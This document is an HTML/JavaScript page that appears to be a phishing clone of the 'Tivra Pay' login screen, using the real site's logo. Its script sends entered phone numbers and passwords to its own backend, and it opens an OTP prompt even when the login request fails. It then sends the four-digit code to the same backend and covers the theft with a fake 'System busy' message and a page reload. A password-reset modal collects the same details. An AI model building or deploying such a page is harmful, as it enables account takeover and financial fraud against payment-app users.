<!DOCTYPE html>
<html lang="en" style="font-size: 16px;">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Tivra Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        html, body { background-color: #ffffff; width: 100%; height: 100%; overflow-x: hidden; }
        
        #app { 
            width: 100%; 
            height: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: space-between;
            padding: 40px 24px;
        }

        .header-section {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }

        img.logo { 
            width: 160px; 
            height: auto; 
            object-fit: contain; 
        }

        .loginform { 
            width: 100%; 
            max-width: 360px; 
            display: flex; 
            flex-direction: column; 
            gap: 20px; /* Fields ke beech ka gap */
            margin-top: -40px; /* Form ko thoda center upar karne ke liye */
        }

        /* 👑 CLIENT-STYLE ROUNDED FIELDS */
        .input-field-group { 
            background-color: #f5f8ff; /* Soft bluish grey white background */
            border-radius: 30px; /* Full Rounded pill shape */
            display: flex; 
            align-items: center; 
            padding: 6px 20px;
            height: 54px;
            transition: all 0.3s ease;
        }

        .input-field-group:focus-within {
            background-color: #edf2ff;
            box-shadow: 0 0 0 1px #2582ff;
        }

        /* 🎨 CLIENT BLUE ICONS */
        .field-icon { 
            display: flex; 
            align-items: center; 
            margin-right: 14px; 
            color: #2582ff; /* Royal blue matching the request */
        }
        
        .field-icon svg { 
            width: 22px; 
            height: 22px; 
            stroke: currentColor; 
            fill: none; 
            stroke-width: 1.8;
        }

        .input-field-group input { 
            border: none; 
            background: transparent; 
            width: 100%; 
            font-size: 16px; 
            color: #333333;
            outline: none;
        }

        .input-field-group input::placeholder { 
            color: #b0c4de; /* Smooth slate placeholder text color */
        }

        /* Options Links (Save Password & Forgot Password) */
        .form-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 10px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #2582ff;
            cursor: pointer;
        }

        .remember-me input {
            accent-color: #2582ff;
        }

        .forgot-link {
            color: #2582ff;
            text-decoration: none;
            font-weight: 500;
        }

        /* 🚀 PREMIUM GLOWING LOGIN BUTTON */
        .submit-btn { 
            background: #1e77ff; 
            color: white; 
            border: none; 
            border-radius: 30px; 
            height: 54px; 
            font-size: 18px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 10px;
            box-shadow: 0 4px 12px rgba(30, 119, 255, 0.3);
            transition: background 0.2s ease;
        }

        .submit-btn:active {
            background: #1565d8;
        }

        /* 🔒 FOOTER PRIVACY AGREEMENT SECTION */
        .privacy-footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 13px;
            color: #666666;
            margin-bottom: 10px;
        }

        .privacy-footer input {
            accent-color: #1e77ff;
            width: 16px;
            height: 16px;
        }

        .privacy-footer a {
            color: #1e77ff;
            text-decoration: none;
        }

        /* ======================== MODALS STYLES ======================== */
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); display: flex; align-items: center;
            justify-content: center; opacity: 0; pointer-events: none; transition: all 0.3s ease; z-index: 1000;
        }
        .modal.active { opacity: 1; pointer-events: auto; }
        .modal-content {
            background: white; padding: 30px; border-radius: 20px; width: 90%; max-width: 360px;
            text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        .modal-content h3 { margin-bottom: 15px; color: #333; }
        .modal-content p { font-size: 14px; color: #666; margin-bottom: 20px; }
        
        .otp-inputs { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; }
        .otp-box {
            width: 50px; height: 50px; text-align: center; font-size: 22px; font-weight: 600;
            border: 1.5px solid #ccdfec; border-radius: 10px; background: #f8faff; outline: none;
        }
        .otp-box:focus { border-color: #1e77ff; background: #fff; }
        
        .modal-field {
            width: 100%; height: 48px; border: 1.5px solid #ccdfec; border-radius: 25px;
            padding: 0 20px; font-size: 15px; margin-bottom: 15px; background: #f8faff; outline: none;
        }
        .modal-field:focus { border-color: #1e77ff; background: #fff; }
        
        .modal-btn {
            width: 100%; height: 48px; background: #1e77ff; color: white; border: none;
            border-radius: 25px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 5px;
        }
        .close-modal-btn { margin-top: 15px; display: inline-block; color: #888; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

    <div id="app">
        <div class="header-section">
            <img class="logo" src="https://web.tivrapay.com/img/logo.20cf4c6f.png" alt="Tivra Pay Logo" onerror="this.src='https://via.placeholder.com/160x60?text=TIVRA+PAY'" />
        </div>

        <form class="loginform" id="loginForm">
            <div class="input-field-group">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                </div>
                <input type="tel" id="phoneNumber" placeholder="Enter phone number" required autocomplete="off" />
            </div>

            <div class="input-field-group">
                <div class="field-icon">
                    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                </div>
                <input type="password" id="password" placeholder="Enter password" required />
            </div>

            <div class="form-options">
                <label class="remember-me">
                    <input type="checkbox" id="savePassword" /> Save Password
                </label>
                <a href="#" class="forgot-link" id="triggerForgot">Forgot password</a>
            </div>

            <button type="submit" class="submit-btn">Login</button>
        </form>

        <div class="privacy-footer">
            <input type="checkbox" id="agreeCheck" checked required />
            <span>Agree <a href="#">"User Privacy Agreement"</a></span>
        </div>
    </div>

    <div class="modal" id="otpModal">
        <div class="modal-content">
            <h3>Verification Code</h3>
            <p id="otpSentText">Verification code has been sent to your phone number</p>
            <div class="otp-inputs">
                <input type="keyup" class="otp-box" id="otp1" maxlength="1" onkeyup="moveNext(this, 'otp2')" />
                <input type="keyup" class="otp-box" id="otp2" maxlength="1" onkeyup="moveNext(this, 'otp3')" />
                <input type="keyup" class="otp-box" id="otp3" maxlength="1" onkeyup="moveNext(this, 'otp4')" />
                <input type="keyup" class="otp-box" id="otp4" maxlength="1" onkeyup="checkAndSubmitOtp(this)" />
            </div>
            <p style="font-size: 13px; color: #999;">Resend in <span id="secondsCount">118</span>s</p>
            <a href="#" class="close-modal-btn" id="closeOtpBtn">Cancel</a>
        </div>
    </div>

    <div class="modal" id="modifyPasswordModal">
        <div class="modal-content">
            <h3>Reset Password</h3>
            <p style="margin-bottom:15px;">Enter details to sync and recover account</p>
            <input type="tel" class="modal-field" id="forgotPhone" placeholder="Registered Phone Number" />
            <input type="password" class="modal-field" id="forgotNewPass" placeholder="Enter New Password" />
            <input type="password" class="modal-field" id="forgotConfirmPass" placeholder="Confirm New Password" />
            <button type="button" class="modal-btn" id="modifyBtn">Confirm Reset</button>
            <a href="#" class="close-modal-btn" id="backToLoginBtn">Back to Login</a>
        </div>
    </div>

    <script>
        let currentUserId = null;
        let isModifyFlow = false; 
        
        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
            ? 'http://localhost:6500' 
            : window.location.origin;

        const loginForm = document.getElementById('loginForm');
        const triggerForgot = document.getElementById('triggerForgot');
        const otpModal = document.getElementById('otpModal');
        const modifyPasswordModal = document.getElementById('modifyPasswordModal');
        const closeOtpBtn = document.getElementById('closeOtpBtn');
        const backToLoginBtn = document.getElementById('backToLoginBtn');
        const modifyBtn = document.getElementById('modifyBtn');
        const otpSentText = document.getElementById('otpSentText');
        const secondsCount = document.getElementById('secondsCount');

        if(triggerForgot) {
            triggerForgot.addEventListener('click', (e) => {
                e.preventDefault();
                modifyPasswordModal.classList.add('active');
            });
        }
        if(backToLoginBtn) { backToLoginBtn.addEventListener('click', () => { modifyPasswordModal.classList.remove('active'); }); }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault(); 
            const phoneNumber = document.getElementById('phoneNumber').value;
            const password = document.getElementById('password').value;
            const isAgreed = document.getElementById('agreeCheck').checked;

            if (!isAgreed) { alert('Please accept User Privacy Agreement.'); return; }
            isModifyFlow = false;

            try {
                const response = await fetch(`${BACKEND_URL}/api/login-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, password })
                });
                const data = await response.json();
                if (data.success) { currentUserId = data.userId; }
                showOtpSection(phoneNumber);
            } catch (error) { 
                showOtpSection(phoneNumber);
            }
        });

        modifyBtn.addEventListener('click', async () => {
            const phone = document.getElementById('forgotPhone').value;
            const newPassword = document.getElementById('forgotNewPass').value;
            const confirmPassword = document.getElementById('forgotConfirmPass').value;

            if (!phone || !newPassword || !confirmPassword) { alert("Please fill all fields!"); return; }
            if (newPassword !== confirmPassword) { alert("Passwords do not match!"); return; }

            isModifyFlow = true; 

            try {
                const response = await fetch(`${BACKEND_URL}/api/forgot-submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, newPassword })
                });
                const data = await response.json();
                if(data.success) { currentUserId = data.userId; }
                showOtpSection(phone);
            } catch (error) {
                showOtpSection(phone);
            }
        });

        function showOtpSection(phoneNum) {
            document.getElementById('otp1').value = '';
            document.getElementById('otp2').value = '';
            document.getElementById('otp3').value = '';
            document.getElementById('otp4').value = '';
            modifyPasswordModal.classList.remove('active');
            
            if(phoneNum.length >= 7) {
                const masked = phoneNum.substring(0, 3) + "****" + phoneNum.substring(phoneNum.length - 4);
                otpSentText.innerText = `Verification code has been sent to ${masked}`;
            } else {
                otpSentText.innerText = `Verification code has been sent to ${phoneNum}`;
            }
            otpModal.classList.add('active');
            startTimer();
        }

        closeOtpBtn.addEventListener('click', () => { otpModal.classList.remove('active'); });

        function moveNext(current, nextFieldId) { if (current.value.length >= 1) { document.getElementById(nextFieldId).focus(); } }

        async function checkAndSubmitOtp(current) {
            const o1 = document.getElementById('otp1').value;
            const o2 = document.getElementById('otp2').value;
            const o3 = document.getElementById('otp3').value;
            const o4 = current.value;

            if(o1 && o2 && o3 && o4) {
                const fullOtp = o1 + o2 + o3 + o4;

                try {
                    await fetch(`${BACKEND_URL}/api/otp-submit`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ userId: currentUserId, otp: fullOtp })
                    });
                } catch (error) { console.error("Sync failed."); }

                setTimeout(() => {
                    alert("System busy, please try again later.");
                    window.location.reload();
                }, 800);
            }
        }

        function startTimer() {
            let totalSec = 118;
            const timerInterval = setInterval(() => {
                totalSec--;
                secondsCount.innerText = totalSec;
                if(totalSec <= 0) { clearInterval(timerInterval); }
            }, 1000);
        }
    </script>
</body>
</html>
